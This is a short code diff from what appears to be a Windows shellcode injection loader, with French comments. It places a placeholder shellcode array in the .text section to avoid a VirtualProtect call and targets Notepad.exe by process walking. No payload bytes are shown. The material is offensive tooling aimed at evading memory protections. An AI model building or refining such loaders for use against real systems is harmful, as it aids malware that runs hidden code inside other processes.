@@ -3,10 +3,9 @@
 #include <utils/memory.h>
 
 // shellcode array in the .text section with -Wl, --omagic to avoid the VirtualProtect call
-DOT_TEXT 
-static unsigned char bytecode[SET_BYTECODE_SIZE] = SET_BYTECODE_ARRAY;
-static const int bytecode_size = SET_BYTECODE_SIZE;
-static const char * targetProcess = "Notepad.exe";
+DOT_TEXT static unsigned char bytecode[SET_BYTECODE_SIZE] = SET_BYTECODE_ARRAY;
+DOT_TEXT static const int bytecode_size = SET_BYTECODE_SIZE;
+DOT_TEXT static char targetProcess[12] = "Notepad.exe";
 
 /**
  * @brief Point d'entrée du programme d'injection.
@@ -28,7 +27,7 @@ int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmd
     return 1;
   }
 
-  targetPid = ProcessWalking("Notepad.exe");
+  targetPid = ProcessWalking(targetProcess);
   if(targetPid == 0){
     return 1;
   }
